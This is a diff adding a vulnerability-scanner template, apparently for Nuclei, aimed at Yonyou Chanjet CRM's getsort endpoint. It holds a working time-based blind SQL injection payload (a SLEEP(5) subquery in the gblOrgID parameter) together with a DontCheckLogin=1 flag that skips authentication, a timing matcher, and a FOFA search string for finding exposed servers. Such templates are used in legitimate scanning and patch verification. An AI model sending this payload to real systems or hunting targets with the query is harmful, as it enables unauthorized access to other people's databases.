@@ -1,0 +1,36 @@
+id: poc-dpewncr3enlomo7i
+info:
+  name: 用友畅捷通CRM getsort 存在SQL 注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/dpewncr3enlomo7i
+
+    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: dpewncr3enlomo7i
+    fofa: title="畅捷CRM"
+http:
+- raw:
+  - 'GET /lead/leadreadydata.php/getsort?id=1&gblOrgID=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a)--+-&DontCheckLogin=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
+
+    Priority: u=1
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Upgrade-Insecure-Requests: 1'
+  redirects: false
+  matchers:
+  - type: dsl
+    dsl:
+    - status_code == 200 && duration >= 5
+    condition: and
